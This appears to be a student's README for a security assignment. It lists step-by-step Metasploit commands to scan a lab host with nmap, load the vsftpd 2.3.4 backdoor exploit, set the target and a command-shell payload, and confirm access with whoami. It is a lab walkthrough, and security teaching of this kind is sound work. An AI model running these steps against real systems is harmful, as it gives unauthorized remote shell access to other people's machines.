# IS-IA-2

The Security Tool Used for the IS IA-2 IS MetaSploit


the youtube video: https://youtu.be/iUixhELjZxk 


commands

install Metasploit
sudo apt install metasploit-framework

Scan the tagret network using Nmap to find open ports 
nmap 192.168.0.119

Run metasploit
sudo msfconsole

search for the version to find a particular exploit
search vsftpd

run the exploit
use exploit/unix/ftp/vsftpd_234_backdoor
show options

adding IP to the remote hosts
set RHOSTS  192.168.0.119
show options

Set the payload
set payload cmd/unix/interact

Start the exploit
exploit

Check if we gained the access
whoami



